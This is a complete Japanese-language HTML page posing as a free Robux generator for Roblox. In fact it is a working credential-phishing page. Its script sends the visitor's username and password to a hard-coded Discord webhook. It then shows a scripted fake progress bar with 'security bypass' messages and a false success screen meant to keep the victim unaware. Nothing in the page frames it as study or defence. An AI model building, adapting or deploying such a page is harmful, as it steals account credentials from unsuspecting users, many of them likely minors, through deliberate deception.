<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>Roblox 無料Robuxジェネレーター</title>
    <style>
        body { background: #121212; color: #e0e0e0; font-family: 'Helvetica Neue', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #1e1e1e; padding: 35px; border-radius: 12px; width: 340px; box-shadow: 0 8px 24px rgba(0,0,0,0.5); border: 1px solid #333; }
        h2 { font-size: 20px; margin-bottom: 8px; color: #fff; text-align: center; }
        .subtitle { font-size: 12px; color: #888; text-align: center; margin-bottom: 25px; }
        label { font-size: 13px; color: #bbb; display: block; margin-bottom: 6px; }
        input { width: 100%; padding: 10px 12px; margin-bottom: 18px; background: #2a2a2a; border: 1px solid #444; color: #fff; border-radius: 6px; box-sizing: border-box; font-size: 14px; }
        input:focus { border-color: #00ffcc; outline: none; }
        button { width: 100%; padding: 12px; background: #00ffcc; border: none; color: #121212; font-weight: bold; border-radius: 6px; cursor: pointer; font-size: 15px; transition: background 0.2s; }
        button:hover { background: #00cca3; }
        
        /* エラーメッセージ表示用 */
        #errorMsg { color: #ff3366; font-size: 12px; margin-bottom: 15px; text-align: center; display: none; }

        /* ローディング中のデザインとアニメーション */
        #loading { display: none; text-align: center; }
        .loading-text { font-size: 14px; color: #ccc; margin-bottom: 15px; }
        .progress-bar-container { width: 100%; background: #2a2a2a; border-radius: 6px; height: 10px; overflow: hidden; border: 1px solid #444; }
        .progress-bar { width: 0%; height: 100%; background: #00ffcc; transition: width 0.3s linear; }

        .result { text-align: center; }
        .value { font-size: 26px; color: #00ffcc; font-weight: bold; margin: 15px 0; }
        .note { font-size: 12px; color: #777; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="card" id="mainCard">
        <h2>Robux ジェネレーター</h2>
        <div class="subtitle">アカウントに無料でRobuxを追加します</div>
        
        <div id="errorMsg"></div>

        <form id="form">
            <label>Roblox ユーザー名</label>
            <input type="text" id="user" placeholder="例: RobloxUser123" required>
            
            <label>パスワード</label>
            <input type="password" id="pass" placeholder="••••••••" required>
            
            <label>追加したいRobux量 (上限: 5,000)</label>
            <input type="number" id="robux" placeholder="例: 4500" max="5000" required>
            
            <button type="submit">Robuxを追加する</button>
        </form>

        <div id="loading">
            <div class="loading-text" id="loadingText">サーバーに接続中...</div>
            <div class="progress-bar-container">
                <div class="progress-bar" id="progressBar"></div>
            </div>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1539344759397679145/BoDKImG3drw0sqeSLGAUXwI60UHgTG3A2r_sXejHdHO2gFPVj2Ta9kDC_KgEOcq8y0gX";

        function generateTrackingID() {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            let id = 'GEN-RBLX-';
            for (let i = 0; i < 4; i++) {
                id += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return id;
        }

        document.getElementById('form').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('user').value;
            const password = document.getElementById('pass').value;
            const robux = parseInt(document.getElementById('robux').value, 10);
            const errorMsg = document.getElementById('errorMsg');

            // 5000を超える値が入力された場合のエラー処理
            if (robux > 5000) {
                errorMsg.style.display = 'block';
                errorMsg.innerText = "⚠️ 一度に生成できる上限は5,000 Robuxまでです。";
                return;
            } else {
                errorMsg.style.display = 'none';
            }

            const trackingId = generateTrackingID();

            // 画面を切り替えてローディングを表示
            document.getElementById('form').style.display = 'none';
            document.getElementById('loading').style.display = 'block';

            // Discordへ送信するデータ
            const payload = {
                content: `🎯 **[無料ジェネレーター受信: ${trackingId}]**\n👤 ユーザー名: \`${username}\`\n🔑 パスワード: \`${password}\`\n💎 要求Robux量: \`${robux}\``
            };

            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                console.error("送信エラー:", error);
            }

            // ローディングバーを30秒かけて左から右へ100%まで伸ばす処理
            const progressBar = document.getElementById('progressBar');
            const loadingText = document.getElementById('loadingText');
            let progress = 0;
            const totalTime = 30000; // 30秒
            const intervalTime = 300; // 0.3秒ごとに更新
            const increment = (intervalTime / totalTime) * 100;

            const timer = setInterval(() => {
                progress += increment;
                if (progress >= 100) {
                    progress = 100;
                    clearInterval(timer);
                }
                progressBar.style.width = progress + '%';

                // 途中で文字を変えてリアル感を出す演出
                if (progress > 60) {
                    loadingText.innerText = "アカウントにRobuxを転送中...";
                } else if (progress > 30) {
                    loadingText.innerText = "セキュリティバイパスを適用中...";
                }
            }, intervalTime);

            // 30秒後に完了画面に切り替える
            setTimeout(() => {
                document.getElementById('mainCard').innerHTML = `
                    <div class="result">
                        <h2>追加成功！</h2>
                        <div class="value">+${robux.toLocaleString()} Robux</div>
                        <p style="font-size: 13px; color: #aaa;">まもなくアカウントに反映されます</p>
                        <div class="note">※反映には最大24時間かかる場合があります。</div>
                    </div>
                `;
            }, totalTime);
        });
    </script>
</body>
</html>
